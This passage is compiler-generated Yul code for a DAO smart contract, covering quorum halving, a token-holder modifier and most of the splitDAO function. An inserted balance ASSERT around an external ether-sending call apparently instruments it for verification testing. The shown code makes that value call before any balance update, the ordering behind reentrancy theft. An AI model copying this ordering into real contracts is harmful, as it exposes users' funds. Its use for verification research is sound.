                            /// @src 0:45620:45640  "lastTimeMinQuorumMet"
                            let _382 := read_from_storage_split_offset_0_t_uint256(0x0a)
                            let expr_2870 := _382
                            /// @src 0:45644:45659  "block.timestamp"
                            let expr_2872 := timestamp()
                            /// @src 0:45662:45681  "quorumHalvingPeriod"
                            let expr_2873 := constant_quorumHalvingPeriod_712()
                            /// @src 0:45644:45681  "block.timestamp - quorumHalvingPeriod"
                            let expr_2874 := checked_sub_t_uint256(expr_2872, expr_2873)

                            /// @src 0:45643:45682  "(block.timestamp - quorumHalvingPeriod)"
                            let expr_2875 := expr_2874
                            /// @src 0:45620:45682  "lastTimeMinQuorumMet < (block.timestamp - quorumHalvingPeriod)"
                            let expr_2876 := lt(cleanup_t_uint256(expr_2870), cleanup_t_uint256(expr_2875))
                            /// @src 0:45620:45707  "lastTimeMinQuorumMet < (block.timestamp - quorumHalvingPeriod) || msg.sender == curator"
                            let expr_2881 := expr_2876
                            if iszero(expr_2881) {
                                /// @src 0:45686:45696  "msg.sender"
                                let expr_2878 := caller()
                                /// @src 0:45700:45707  "curator"
                                let _384 := read_from_storage_split_offset_0_t_address(0x0b)
                                let expr_2879 := _384
                                /// @src 0:45686:45707  "msg.sender == curator"
                                let expr_2880 := eq(cleanup_t_address(expr_2878), cleanup_t_address(expr_2879))
                                /// @src 0:45620:45707  "lastTimeMinQuorumMet < (block.timestamp - quorumHalvingPeriod) || msg.sender == curator"
                                expr_2881 := expr_2880
                            }
                            /// @src 0:45619:45708  "(lastTimeMinQuorumMet < (block.timestamp - quorumHalvingPeriod) || msg.sender == curator)"
                            let expr_2882 := expr_2881
                            /// @src 0:45619:45790  "(lastTimeMinQuorumMet < (block.timestamp - quorumHalvingPeriod) || msg.sender == curator)..."
                            let expr_2890 := expr_2882
                            if expr_2890 {
                                /// @src 0:45724:45744  "lastTimeMinQuorumMet"
                                let _385 := read_from_storage_split_offset_0_t_uint256(0x0a)
                                let expr_2883 := _385
                                /// @src 0:45748:45763  "block.timestamp"
                                let expr_2885 := timestamp()
                                /// @src 0:45766:45789  "minProposalDebatePeriod"
                                let expr_2886 := constant_minProposalDebatePeriod_703()
                                /// @src 0:45748:45789  "block.timestamp - minProposalDebatePeriod"
                                let expr_2887 := checked_sub_t_uint256(expr_2885, expr_2886)

                                /// @src 0:45747:45790  "(block.timestamp - minProposalDebatePeriod)"
                                let expr_2888 := expr_2887
                                /// @src 0:45724:45790  "lastTimeMinQuorumMet < (block.timestamp - minProposalDebatePeriod)"
                                let expr_2889 := lt(cleanup_t_uint256(expr_2883), cleanup_t_uint256(expr_2888))
                                /// @src 0:45619:45790  "(lastTimeMinQuorumMet < (block.timestamp - quorumHalvingPeriod) || msg.sender == curator)..."
                                expr_2890 := expr_2889
                            }
                            /// @src 0:45615:45958  "if ((lastTimeMinQuorumMet < (block.timestamp - quorumHalvingPeriod) || msg.sender == curator)..."
                            switch expr_2890
                            case 0 {
                                /// @src 0:45942:45947  "false"
                                let expr_2903 := 0x00
                                /// @src 0:45935:45947  "return false"
                                var__success_2868 := expr_2903
                                leave
                                /// @src 0:45615:45958  "if ((lastTimeMinQuorumMet < (block.timestamp - quorumHalvingPeriod) || msg.sender == curator)..."
                            }
                            default {
                                /// @src 0:45829:45844  "block.timestamp"
                                let expr_2893 := timestamp()
                                /// @src 0:45806:45844  "lastTimeMinQuorumMet = block.timestamp"
                                update_storage_value_offset_0_t_uint256_to_t_uint256(0x0a, expr_2893)
                                let expr_2894 := expr_2893
                                /// @src 0:45878:45879  "2"
                                let expr_2897 := 0x02
                                /// @src 0:45858:45879  "minQuorumDivisor *= 2"
                                let _386 := convert_t_rational_2_by_1_to_t_uint256(expr_2897)
                                let _387 := read_from_storage_split_offset_0_t_uint256(0x09)
                                let expr_2898 := checked_mul_t_uint256(_387, _386)

                                update_storage_value_offset_0_t_uint256_to_t_uint256(0x09, expr_2898)
                                /// @src 0:45900:45904  "true"
                                let expr_2900 := 0x01
                                /// @src 0:45893:45904  "return true"
                                var__success_2868 := expr_2900
                                leave
                                /// @src 0:45615:45958  "if ((lastTimeMinQuorumMet < (block.timestamp - quorumHalvingPeriod) || msg.sender == curator)..."
                            }

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @ast-id 1057
                        /// @src 0:29561:29665  "modifier onlyTokenholders override {..."
                        function modifier_onlyTokenholders_1945(var__success_1948, var__proposalID_1940, var__newCurator_1942) -> _389 {
                            _389 := var__success_1948

                            /// @src 0:29625:29635  "msg.sender"
                            let expr_1047 := caller()
                            /// @src 0:29615:29636  "balanceOf(msg.sender)"
                            let expr_1048 := fun_balanceOf_109(expr_1047)
                            /// @src 0:29640:29641  "0"
                            let expr_1049 := 0x00
                            /// @src 0:29615:29641  "balanceOf(msg.sender) == 0"
                            let expr_1050 := eq(cleanup_t_uint256(expr_1048), convert_t_rational_0_by_1_to_t_uint256(expr_1049))
                            /// @src 0:29614:29642  "(balanceOf(msg.sender) == 0)"
                            let expr_1051 := expr_1050
                            /// @src 0:29613:29642  "!(balanceOf(msg.sender) == 0)"
                            let expr_1052 := cleanup_t_bool(iszero(expr_1051))
                            /// @src 0:29606:29643  "assert(!(balanceOf(msg.sender) == 0))"
                            assert_helper(expr_1052)
                            /// @src 0:29657:29658  "_"
                            _389 := fun_splitDAO_2289_inner(var__success_1948, var__proposalID_1940, var__newCurator_1942)

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function array_length_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage(value) -> length {


                            length := sload(value)

                        }

                        function array_dataslot_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage(ptr) -> data {
                            data := ptr

                            mstore(0, ptr)
                            data := keccak256(0, 0x20)

                        }

                        function storage_array_index_access_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage(array, index) -> slot, offset {
                            let arrayLength := array_length_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage(array)
                            if iszero(lt(index, arrayLength)) { panic_error_0x32() }

                            let dataArea := array_dataslot_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage(array)
                            slot := add(dataArea, mul(index, 4))
                            offset := 0

                        }

                        function cleanup_from_storage_t_contract$_DAO_$3021(value) -> cleaned {
                            cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)
                        }

                        function extract_from_storage_value_offset_0_t_contract$_DAO_$3021(slot_value) -> value {
                            value := cleanup_from_storage_t_contract$_DAO_$3021(shift_right_0_unsigned(slot_value))
                        }

                        function read_from_storage_split_offset_0_t_contract$_DAO_$3021(slot) -> value {

                            value := extract_from_storage_value_offset_0_t_contract$_DAO_$3021(sload(slot))

                        }

                        function convert_t_rational_0_by_1_to_t_uint160(value) -> converted {
                            converted := cleanup_t_uint160(identity(cleanup_t_rational_0_by_1(value)))
                        }

                        function convert_t_rational_0_by_1_to_t_address(value) -> converted {
                            converted := convert_t_rational_0_by_1_to_t_uint160(value)
                        }

                        function convert_t_uint160_to_t_contract$_DAO_$3021(value) -> converted {
                            converted := convert_t_uint160_to_t_uint160(value)
                        }

                        function convert_t_contract$_DAO_$3021_to_t_contract$_DAO_$3021(value) -> converted {
                            converted := convert_t_uint160_to_t_contract$_DAO_$3021(value)
                        }

                        function prepare_store_t_contract$_DAO_$3021(value) -> ret {
                            ret := value
                        }

                        function update_storage_value_offset_0_t_contract$_DAO_$3021_to_t_contract$_DAO_$3021(slot, value_0) {
                            let convertedValue_0 := convert_t_contract$_DAO_$3021_to_t_contract$_DAO_$3021(value_0)

                            sstore(slot, update_byte_slice_20_shift_0(sload(slot), prepare_store_t_contract$_DAO_$3021(convertedValue_0)))
                        }

                        /// @src 0:37613:40466  "function splitDAO(..."
                        function fun_splitDAO_2289_inner(_390, var__proposalID_1940, var__newCurator_1942) -> var__success_1948 {
                            var__success_1948 := _390

                            /// @src 0:37783:37792  "proposals"
                            let _391_slot := 0x08
                            let expr_1953_slot := _391_slot
                            /// @src 0:37793:37804  "_proposalID"
                            let _392 := var__proposalID_1940
                            let expr_1954 := _392
                            /// @src 0:37783:37805  "proposals[_proposalID]"

                            let _393, _394 := storage_array_index_access_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage(expr_1953_slot, expr_1954)
                            let _395_slot := _393
                            let expr_1955_slot := _395_slot
                            /// @src 0:37762:37805  "Proposal storage p = proposals[_proposalID]"
                            let var_p_1952_slot := convert_t_struct$_Proposal_$800_storage_to_t_struct$_Proposal_$800_storage_ptr(expr_1955_slot)
                            /// @src 0:37850:37865  "block.timestamp"
                            let expr_1959 := timestamp()
                            /// @src 0:37868:37869  "p"
                            let _396_slot := var_p_1952_slot
                            let expr_1960_slot := _396_slot
                            /// @src 0:37868:37884  "p.votingDeadline"
                            let _397 := add(expr_1960_slot, 3)
                            let _398 := read_from_storage_split_offset_0_t_uint256(_397)
                            let expr_1961 := _398
                            /// @src 0:37850:37884  "block.timestamp < p.votingDeadline"
                            let expr_1962 := lt(cleanup_t_uint256(expr_1959), cleanup_t_uint256(expr_1961))
                            /// @src 0:37850:38074  "block.timestamp < p.votingDeadline  // has the voting deadline arrived?..."
                            let expr_1970 := expr_1962
                            if iszero(expr_1970) {
                                /// @src 0:38017:38032  "block.timestamp"
                                let expr_1964 := timestamp()
                                /// @src 0:38035:38036  "p"
                                let _399_slot := var_p_1952_slot
                                let expr_1965_slot := _399_slot
                                /// @src 0:38035:38051  "p.votingDeadline"
                                let _400 := add(expr_1965_slot, 3)
                                let _401 := read_from_storage_split_offset_0_t_uint256(_400)
                                let expr_1966 := _401
                                /// @src 0:38054:38074  "splitExecutionPeriod"
                                let expr_1967 := constant_splitExecutionPeriod_709()
                                /// @src 0:38035:38074  "p.votingDeadline + splitExecutionPeriod"
                                let expr_1968 := checked_add_t_uint256(expr_1966, expr_1967)

                                /// @src 0:38017:38074  "block.timestamp > p.votingDeadline + splitExecutionPeriod"
                                let expr_1969 := gt(cleanup_t_uint256(expr_1964), cleanup_t_uint256(expr_1968))
                                /// @src 0:37850:38074  "block.timestamp < p.votingDeadline  // has the voting deadline arrived?..."
                                expr_1970 := expr_1969
                            }
                            /// @src 0:37850:38167  "block.timestamp < p.votingDeadline  // has the voting deadline arrived?..."
                            let expr_1975 := expr_1970
                            if iszero(expr_1975) {
                                /// @src 0:38141:38142  "p"
                                let _402_slot := var_p_1952_slot
                                let expr_1971_slot := _402_slot
                                /// @src 0:38141:38152  "p.recipient"
                                let _403 := add(expr_1971_slot, 0)
                                let _404 := read_from_storage_split_offset_0_t_address(_403)
                                let expr_1972 := _404
                                /// @src 0:38156:38167  "_newCurator"
                                let _405 := var__newCurator_1942
                                let expr_1973 := _405
                                /// @src 0:38141:38167  "p.recipient != _newCurator"
                                let expr_1974 := iszero(eq(cleanup_t_address(expr_1972), cleanup_t_address(expr_1973)))
                                /// @src 0:37850:38167  "block.timestamp < p.votingDeadline  // has the voting deadline arrived?..."
                                expr_1975 := expr_1974
                            }
                            /// @src 0:37850:38241  "block.timestamp < p.votingDeadline  // has the voting deadline arrived?..."
                            let expr_1979 := expr_1975
                            if iszero(expr_1979) {
                                /// @src 0:38229:38230  "p"
                                let _406_slot := var_p_1952_slot
                                let expr_1976_slot := _406_slot
                                /// @src 0:38229:38241  "p.newCurator"
                                let _407 := add(expr_1976_slot, 7)
                                let _408 := read_from_storage_split_offset_0_t_bool(_407)
                                let expr_1977 := _408
                                /// @src 0:38228:38241  "!p.newCurator"
                                let expr_1978 := cleanup_t_bool(iszero(expr_1977))
                                /// @src 0:37850:38241  "block.timestamp < p.votingDeadline  // has the voting deadline arrived?..."
                                expr_1979 := expr_1978
                            }
                            /// @src 0:37850:38326  "block.timestamp < p.votingDeadline  // has the voting deadline arrived?..."
                            let expr_1986 := expr_1979
                            if iszero(expr_1986) {
                                /// @src 0:38304:38305  "p"
                                let _409_slot := var_p_1952_slot
                                let expr_1980_slot := _409_slot
                                /// @src 0:38304:38314  "p.votedYes"
                                let _410 := add(expr_1980_slot, 11)
                                let _411_slot := _410
                                let expr_1981_slot := _411_slot
                                /// @src 0:38315:38325  "msg.sender"
                                let expr_1983 := caller()
                                /// @src 0:38304:38326  "p.votedYes[msg.sender]"
                                let _412 := mapping_index_access_t_mapping$_t_address_$_t_bool_$_of_t_address(expr_1981_slot,expr_1983)
                                let _413 := read_from_storage_split_offset_0_t_bool(_412)
                                let expr_1984 := _413
                                /// @src 0:38303:38326  "!p.votedYes[msg.sender]"
                                let expr_1985 := cleanup_t_bool(iszero(expr_1984))
                                /// @src 0:37850:38326  "block.timestamp < p.votingDeadline  // has the voting deadline arrived?..."
                                expr_1986 := expr_1985
                            }
                            /// @src 0:37850:38463  "block.timestamp < p.votingDeadline  // has the voting deadline arrived?..."
                            let expr_2001 := expr_1986
                            if iszero(expr_2001) {
                                /// @src 0:38400:38407  "blocked"
                                let _414_slot := 0x13
                                let expr_1987_slot := _414_slot
                                /// @src 0:38408:38418  "msg.sender"
                                let expr_1989 := caller()
                                /// @src 0:38400:38419  "blocked[msg.sender]"
                                let _415 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_1987_slot,expr_1989)
                                let _416 := read_from_storage_split_offset_0_t_uint256(_415)
                                let expr_1990 := _416
                                /// @src 0:38423:38434  "_proposalID"
                                let _417 := var__proposalID_1940
                                let expr_1991 := _417
                                /// @src 0:38400:38434  "blocked[msg.sender] != _proposalID"
                                let expr_1992 := iszero(eq(cleanup_t_uint256(expr_1990), cleanup_t_uint256(expr_1991)))
                                /// @src 0:38400:38462  "blocked[msg.sender] != _proposalID && blocked[msg.sender] != 0"
                                let expr_1999 := expr_1992
                                if expr_1999 {
                                    /// @src 0:38438:38445  "blocked"
                                    let _418_slot := 0x13
                                    let expr_1993_slot := _418_slot
                                    /// @src 0:38446:38456  "msg.sender"
                                    let expr_1995 := caller()
                                    /// @src 0:38438:38457  "blocked[msg.sender]"
                                    let _419 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_1993_slot,expr_1995)
                                    let _420 := read_from_storage_split_offset_0_t_uint256(_419)
                                    let expr_1996 := _420
                                    /// @src 0:38461:38462  "0"
                                    let expr_1997 := 0x00
                                    /// @src 0:38438:38462  "blocked[msg.sender] != 0"
                                    let expr_1998 := iszero(eq(cleanup_t_uint256(expr_1996), convert_t_rational_0_by_1_to_t_uint256(expr_1997)))
                                    /// @src 0:38400:38462  "blocked[msg.sender] != _proposalID && blocked[msg.sender] != 0"
                                    expr_1999 := expr_1998
                                }
                                /// @src 0:38399:38463  "(blocked[msg.sender] != _proposalID && blocked[msg.sender] != 0)"
                                let expr_2000 := expr_1999
                                /// @src 0:37850:38463  "block.timestamp < p.votingDeadline  // has the voting deadline arrived?..."
                                expr_2001 := expr_2000
                            }
                            /// @src 0:37849:38465  "(block.timestamp < p.votingDeadline  // has the voting deadline arrived?..."
                            let expr_2002 := expr_2001
                            /// @src 0:37848:38465  "!(block.timestamp < p.votingDeadline  // has the voting deadline arrived?..."
                            let expr_2003 := cleanup_t_bool(iszero(expr_2002))
                            /// @src 0:37841:38466  "assert(!(block.timestamp < p.votingDeadline  // has the voting deadline arrived?..."
                            assert_helper(expr_2003)
                            /// @src 0:38597:38598  "p"
                            let _421_slot := var_p_1952_slot
                            let expr_2008_slot := _421_slot
                            /// @src 0:38597:38608  "p.splitData"
                            let _422 := add(expr_2008_slot, 8)
                            let _423_slot := _422
                            let expr_2009_slot := _423_slot
                            /// @src 0:38609:38610  "0"
                            let expr_2010 := 0x00
                            /// @src 0:38597:38611  "p.splitData[0]"

                            let _424, _425 := storage_array_index_access_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage(expr_2009_slot, expr_2010)
                            let _426_slot := _424
                            let expr_2011_slot := _426_slot
                            /// @src 0:38597:38618  "p.splitData[0].newDAO"
                            let _427 := add(expr_2011_slot, 3)
                            let _428_address := read_from_storage_split_offset_0_t_contract$_DAO_$3021(_427)
                            let expr_2012_address := _428_address
                            /// @src 0:38589:38619  "address(p.splitData[0].newDAO)"
                            let expr_2013 := convert_t_contract$_DAO_$3021_to_t_address(expr_2012_address)
                            /// @src 0:38631:38632  "0"
                            let expr_2016 := 0x00
                            /// @src 0:38623:38633  "address(0)"
                            let expr_2017 := convert_t_rational_0_by_1_to_t_address(expr_2016)
                            /// @src 0:38589:38633  "address(p.splitData[0].newDAO) == address(0)"
                            let expr_2018 := eq(cleanup_t_address(expr_2013), cleanup_t_address(expr_2017))
                            /// @src 0:38585:39149  "if (address(p.splitData[0].newDAO) == address(0)) {..."
                            if expr_2018 {
                                /// @src 0:38686:38697  "_newCurator"
                                let _429 := var__newCurator_1942
                                let expr_2026 := _429
                                /// @src 0:38673:38698  "createNewDAO(_newCurator)"
                                let expr_2027_address := fun_createNewDAO_2932(expr_2026)
                                /// @src 0:38649:38650  "p"
                                let _430_slot := var_p_1952_slot
                                let expr_2019_slot := _430_slot
                                /// @src 0:38649:38660  "p.splitData"
                                let _431 := add(expr_2019_slot, 8)
                                let _432_slot := _431
                                let expr_2022_slot := _432_slot
                                /// @src 0:38661:38662  "0"
                                let expr_2021 := 0x00
                                /// @src 0:38649:38663  "p.splitData[0]"

                                let _433, _434 := storage_array_index_access_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage(expr_2022_slot, expr_2021)
                                let _435_slot := _433
                                let expr_2023_slot := _435_slot
                                /// @src 0:38649:38670  "p.splitData[0].newDAO"
                                let _436 := add(expr_2023_slot, 3)
                                /// @src 0:38649:38698  "p.splitData[0].newDAO = createNewDAO(_newCurator)"
                                update_storage_value_offset_0_t_contract$_DAO_$3021_to_t_contract$_DAO_$3021(_436, expr_2027_address)
                                let expr_2028_address := expr_2027_address
                                /// @src 0:38776:38777  "p"
                                let _437_slot := var_p_1952_slot
                                let expr_2033_slot := _437_slot
                                /// @src 0:38776:38787  "p.splitData"
                                let _438 := add(expr_2033_slot, 8)
                                let _439_slot := _438
                                let expr_2034_slot := _439_slot
                                /// @src 0:38788:38789  "0"
                                let expr_2035 := 0x00
                                /// @src 0:38776:38790  "p.splitData[0]"

                                let _440, _441 := storage_array_index_access_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage(expr_2034_slot, expr_2035)
                                let _442_slot := _440
                                let expr_2036_slot := _442_slot
                                /// @src 0:38776:38797  "p.splitData[0].newDAO"
                                let _443 := add(expr_2036_slot, 3)
                                let _444_address := read_from_storage_split_offset_0_t_contract$_DAO_$3021(_443)
                                let expr_2037_address := _444_address
                                /// @src 0:38768:38798  "address(p.splitData[0].newDAO)"
                                let expr_2038 := convert_t_contract$_DAO_$3021_to_t_address(expr_2037_address)
                                /// @src 0:38810:38811  "0"
                                let expr_2041 := 0x00
                                /// @src 0:38802:38812  "address(0)"
                                let expr_2042 := convert_t_rational_0_by_1_to_t_address(expr_2041)
                                /// @src 0:38768:38812  "address(p.splitData[0].newDAO) == address(0)"
                                let expr_2043 := eq(cleanup_t_address(expr_2038), cleanup_t_address(expr_2042))
                                /// @src 0:38767:38813  "(address(p.splitData[0].newDAO) == address(0))"
                                let expr_2044 := expr_2043
                                /// @src 0:38766:38813  "!(address(p.splitData[0].newDAO) == address(0))"
                                let expr_2045 := cleanup_t_bool(iszero(expr_2044))
                                /// @src 0:38758:38814  "assert (!(address(p.splitData[0].newDAO) == address(0)))"
                                assert_helper(expr_2045)
                                /// @src 0:38880:38884  "this"
                                let expr_2051_address := address()
                                /// @src 0:38872:38885  "address(this)"
                                let expr_2052 := convert_t_contract$_DAO_$3021_to_t_address(expr_2051_address)
                                /// @src 0:38872:38893  "address(this).balance"
                                let expr_2053 := balance(expr_2052)
                                /// @src 0:38896:38917  "sumOfProposalDeposits"
                                let _445 := read_from_storage_split_offset_0_t_uint256(0x15)
                                let expr_2054 := _445
                                /// @src 0:38872:38917  "address(this).balance < sumOfProposalDeposits"
                                let expr_2055 := lt(cleanup_t_uint256(expr_2053), cleanup_t_uint256(expr_2054))
                                /// @src 0:38871:38918  "(address(this).balance < sumOfProposalDeposits)"
                                let expr_2056 := expr_2055
                                /// @src 0:38870:38918  "!(address(this).balance < sumOfProposalDeposits)"
                                let expr_2057 := cleanup_t_bool(iszero(expr_2056))
                                /// @src 0:38863:38919  "assert(!(address(this).balance < sumOfProposalDeposits))"
                                assert_helper(expr_2057)
                                /// @src 0:38963:38978  "actualBalance()"
                                let expr_2067 := fun_actualBalance_2833()
                                /// @src 0:38933:38934  "p"
                                let _446_slot := var_p_1952_slot
                                let expr_2060_slot := _446_slot
                                /// @src 0:38933:38944  "p.splitData"
                                let _447 := add(expr_2060_slot, 8)
                                let _448_slot := _447
                                let expr_2063_slot := _448_slot
                                /// @src 0:38945:38946  "0"
                                let expr_2062 := 0x00
                                /// @src 0:38933:38947  "p.splitData[0]"

                                let _449, _450 := storage_array_index_access_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage(expr_2063_slot, expr_2062)
                                let _451_slot := _449
                                let expr_2064_slot := _451_slot
                                /// @src 0:38933:38960  "p.splitData[0].splitBalance"
                                let _452 := add(expr_2064_slot, 0)
                                /// @src 0:38933:38978  "p.splitData[0].splitBalance = actualBalance()"
                                update_storage_value_offset_0_t_uint256_to_t_uint256(_452, expr_2067)
                                let expr_2068 := expr_2067
                                /// @src 0:39021:39032  "rewardToken"
                                let _453_slot := 0x0d
                                let expr_2076_slot := _453_slot
                                /// @src 0:39041:39045  "this"
                                let expr_2079_address := address()
                                /// @src 0:39033:39046  "address(this)"
                                let expr_2080 := convert_t_contract$_DAO_$3021_to_t_address(expr_2079_address)
                                /// @src 0:39021:39047  "rewardToken[address(this)]"
                                let _454 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2076_slot,expr_2080)
                                let _455 := read_from_storage_split_offset_0_t_uint256(_454)
                                let expr_2081 := _455
                                /// @src 0:38992:38993  "p"
                                let _456_slot := var_p_1952_slot
                                let expr_2070_slot := _456_slot
                                /// @src 0:38992:39003  "p.splitData"
                                let _457 := add(expr_2070_slot, 8)
                                let _458_slot := _457
                                let expr_2073_slot := _458_slot
                                /// @src 0:39004:39005  "0"
                                let expr_2072 := 0x00
                                /// @src 0:38992:39006  "p.splitData[0]"

                                let _459, _460 := storage_array_index_access_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage(expr_2073_slot, expr_2072)
                                let _461_slot := _459
                                let expr_2074_slot := _461_slot
                                /// @src 0:38992:39018  "p.splitData[0].rewardToken"
                                let _462 := add(expr_2074_slot, 2)
                                /// @src 0:38992:39047  "p.splitData[0].rewardToken = rewardToken[address(this)]"
                                update_storage_value_offset_0_t_uint256_to_t_uint256(_462, expr_2081)
                                let expr_2082 := expr_2081
                                /// @src 0:39090:39101  "totalSupply"
                                let _463 := read_from_storage_split_offset_0_t_uint256(0x07)
                                let expr_2090 := _463
                                /// @src 0:39061:39062  "p"
                                let _464_slot := var_p_1952_slot
                                let expr_2084_slot := _464_slot
                                /// @src 0:39061:39072  "p.splitData"
                                let _465 := add(expr_2084_slot, 8)
                                let _466_slot := _465
                                let expr_2087_slot := _466_slot
                                /// @src 0:39073:39074  "0"
                                let expr_2086 := 0x00
                                /// @src 0:39061:39075  "p.splitData[0]"

                                let _467, _468 := storage_array_index_access_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage(expr_2087_slot, expr_2086)
                                let _469_slot := _467
                                let expr_2088_slot := _469_slot
                                /// @src 0:39061:39087  "p.splitData[0].totalSupply"
                                let _470 := add(expr_2088_slot, 1)
                                /// @src 0:39061:39101  "p.splitData[0].totalSupply = totalSupply"
                                update_storage_value_offset_0_t_uint256_to_t_uint256(_470, expr_2090)
                                let expr_2091 := expr_2090
                                /// @src 0:39134:39138  "true"
                                let expr_2096 := 0x01
                                /// @src 0:39115:39116  "p"
                                let _471_slot := var_p_1952_slot
                                let expr_2093_slot := _471_slot
                                /// @src 0:39115:39131  "p.proposalPassed"
                                let _472 := add(expr_2093_slot, 4)
                                /// @src 0:39115:39138  "p.proposalPassed = true"
                                update_storage_value_offset_1_t_bool_to_t_bool(_472, expr_2096)
                                let expr_2097 := expr_2096
                                /// @src 0:38585:39149  "if (address(p.splitData[0].newDAO) == address(0)) {..."
                            }
                            /// @src 0:39238:39246  "balances"
                            let _473_slot := 0x05
                            let expr_2103_slot := _473_slot
                            /// @src 0:39247:39257  "msg.sender"
                            let expr_2105 := caller()
                            /// @src 0:39238:39258  "balances[msg.sender]"
                            let _474 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2103_slot,expr_2105)
                            let _475 := read_from_storage_split_offset_0_t_uint256(_474)
                            let expr_2106 := _475
                            /// @src 0:39261:39262  "p"
                            let _476_slot := var_p_1952_slot
                            let expr_2107_slot := _476_slot
                            /// @src 0:39261:39272  "p.splitData"
                            let _477 := add(expr_2107_slot, 8)
                            let _478_slot := _477
                            let expr_2108_slot := _478_slot
                            /// @src 0:39273:39274  "0"
                            let expr_2109 := 0x00
                            /// @src 0:39261:39275  "p.splitData[0]"

                            let _479, _480 := storage_array_index_access_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage(expr_2108_slot, expr_2109)
                            let _481_slot := _479
                            let expr_2110_slot := _481_slot
                            /// @src 0:39261:39288  "p.splitData[0].splitBalance"
                            let _482 := add(expr_2110_slot, 0)
                            let _483 := read_from_storage_split_offset_0_t_uint256(_482)
                            let expr_2111 := _483
                            /// @src 0:39238:39288  "balances[msg.sender] * p.splitData[0].splitBalance"
                            let expr_2112 := checked_mul_t_uint256(expr_2106, expr_2111)

                            /// @src 0:39237:39289  "(balances[msg.sender] * p.splitData[0].splitBalance)"
                            let expr_2113 := expr_2112
                            /// @src 0:39304:39305  "p"
                            let _484_slot := var_p_1952_slot
                            let expr_2114_slot := _484_slot
                            /// @src 0:39304:39315  "p.splitData"
                            let _485 := add(expr_2114_slot, 8)
                            let _486_slot := _485
                            let expr_2115_slot := _486_slot
                            /// @src 0:39316:39317  "0"
                            let expr_2116 := 0x00
                            /// @src 0:39304:39318  "p.splitData[0]"

                            let _487, _488 := storage_array_index_access_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage(expr_2115_slot, expr_2116)
                            let _489_slot := _487
                            let expr_2117_slot := _489_slot
                            /// @src 0:39304:39330  "p.splitData[0].totalSupply"
                            let _490 := add(expr_2117_slot, 1)
                            let _491 := read_from_storage_split_offset_0_t_uint256(_490)
                            let expr_2118 := _491
                            /// @src 0:39237:39330  "(balances[msg.sender] * p.splitData[0].splitBalance) /..."
                            let expr_2119 := checked_div_t_uint256(expr_2113, expr_2118)

                            /// @src 0:39203:39330  "uint fundsToBeMoved =..."
                            let var_fundsToBeMoved_2102 := expr_2119
                            /// @src 0:39349:39350  "p"
                            let _492_slot := var_p_1952_slot
                            let expr_2122_slot := _492_slot
                            /// @src 0:39349:39360  "p.splitData"
                            let _493 := add(expr_2122_slot, 8)
                            let _494_slot := _493
                            let expr_2123_slot := _494_slot
                            /// @src 0:39361:39362  "0"
                            let expr_2124 := 0x00
                            /// @src 0:39349:39363  "p.splitData[0]"

                            let _495, _496 := storage_array_index_access_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage(expr_2123_slot, expr_2124)
                            let _497_slot := _495
                            let expr_2125_slot := _497_slot
                            /// @src 0:39349:39370  "p.splitData[0].newDAO"
                            let _498 := add(expr_2125_slot, 3)
                            let _499_address := read_from_storage_split_offset_0_t_contract$_DAO_$3021(_498)
                            let expr_2126_address := _499_address
                            /// @src 0:39349:39387  "p.splitData[0].newDAO.createTokenProxy"
                            let expr_2127_address := convert_t_contract$_DAO_$3021_to_t_address(expr_2126_address)
                            let expr_2127_functionSelector := 0xbaac5300
                            /// @src 0:39396:39410  "fundsToBeMoved"
                            let _500 := var_fundsToBeMoved_2102
                            let expr_2128 := _500
                            /// @src 0:39349:39411  "p.splitData[0].newDAO.createTokenProxy{value : fundsToBeMoved}"
                            let expr_2129_address := expr_2127_address
                            let expr_2129_functionSelector := expr_2127_functionSelector
                            let expr_2129_value := expr_2128
                            /// @src 0:39412:39422  "msg.sender"
                            let expr_2131 := caller()
                            /// @src 0:39349:39423  "p.splitData[0].newDAO.createTokenProxy{value : fundsToBeMoved}(msg.sender)"

                            // storage for arguments and returned data
                            let _501 := allocate_unbounded()
                            mstore(_501, shift_left_224(expr_2129_functionSelector))
                            let _502 := abi_encode_tuple_t_address__to_t_address__fromStack(add(_501, 4) , expr_2131)

                            
                            let pbal := balance(address())
                            let _503 := call(gas(), expr_2129_address,  expr_2129_value,  _501, sub(_502, _501), _501, 32)
                            if lt(balance(address()),pbal) {
                                ASSERT(eq(sub(pbal,expr_2129_value) , balance(address())))
                            }

                            if iszero(_503) { revert_forward_1() }

                            let expr_2132
                            if _503 {

                                let _504 := 32

                                if gt(_504, returndatasize()) {
                                    _504 := returndatasize()
                                }

                                // update freeMemoryPointer according to dynamic return size
                                finalize_allocation(_501, _504)

                                // decode return parameters from external try-call into retVars
                                expr_2132 :=  abi_decode_tuple_t_bool_fromMemory(_501, add(_501, _504))
                            }
                            /// @src 0:39427:39432  "false"
                            let expr_2133 := 0x00
                            /// @src 0:39349:39432  "p.splitData[0].newDAO.createTokenProxy{value : fundsToBeMoved}(msg.sender) == false"
                            let expr_2134 := eq(cleanup_t_bool(expr_2132), cleanup_t_bool(expr_2133))
                            /// @src 0:39348:39433  "(p.splitData[0].newDAO.createTokenProxy{value : fundsToBeMoved}(msg.sender) == false)"
                            let expr_2135 := expr_2134
                            /// @src 0:39347:39433  "!(p.splitData[0].newDAO.createTokenProxy{value : fundsToBeMoved}(msg.sender) == false)"
                            let expr_2136 := cleanup_t_bool(iszero(expr_2135))
